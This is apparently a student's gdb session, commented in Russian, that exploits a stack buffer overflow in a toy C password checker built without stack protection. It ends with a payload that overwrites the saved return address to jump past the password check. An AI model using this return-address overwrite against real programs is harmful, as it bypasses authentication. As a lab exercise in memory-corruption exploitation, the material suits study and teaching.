gcc Fifth.c -o Fifth -g -fno-stack-protector -no-pie
gdb Fifth
b main
r
(gdb) x/16i $pc
=> 0x4011a2 <main+12>:	lea    0xe5b(%rip),%rax        # 0x402004
   0x4011a9 <main+19>:	mov    %rax,%rdi
   0x4011ac <main+22>:	call   0x401070 <puts@plt>
   0x4011b1 <main+27>:	call   0x4011ee <IsPassOk>
   0x4011b6 <main+32>:	mov    %eax,-0x4(%rbp)
   0x4011b9 <main+35>:	cmpl   $0x0,-0x4(%rbp)
   0x4011bd <main+39>:	jne    0x4011d8 <main+66>
   0x4011bf <main+41>:	lea    0xe4e(%rip),%rax        # 0x402014
   0x4011c6 <main+48>:	mov    %rax,%rdi
   0x4011c9 <main+51>:	call   0x401070 <puts@plt>
   0x4011ce <main+56>:	mov    $0x1,%edi
   0x4011d3 <main+61>:	call   0x4010a0 <exit@plt>
   0x4011d8 <main+66>:	lea    0xe43(%rip),%rax        # 0x402022
   0x4011df <main+73>:	mov    %rax,%rdi
   0x4011e2 <main+76>:	call   0x401070 <puts@plt>
   0x4011e7 <main+81>:	mov    $0x0,%eax

//Заметил что при правильном пароле прыгает на адрес 0x402022
// печатает правильность пароля на 0x4011d8
//Можно set variable Pass="test" чтобы убедиться

//в IsPassOk p *(Pass+11) покажет нуль(символ конца строки)
(gdb) p (Pass+12)
$9 = 0x7fffffffdf20 "@\337\377\377\377\177"
(gdb) x/2a 0x7fffffffdf20
0x7fffffffdf20:	0x7fffffffdf40	0x4011b6 <main+32>
//char[] Pass Начинается с 0x7fffffffdf14 добавим 8 символов и адресс 0x4011d8 в качестве символов
run <<< $(echo -e "00000000000000000000\xd8\x11\x40\x00\x00\x00\x00\x00")
// \xd8\x11\x40\x00\x00\x00\x00\x00 -представление в little-endian 0x4011d8
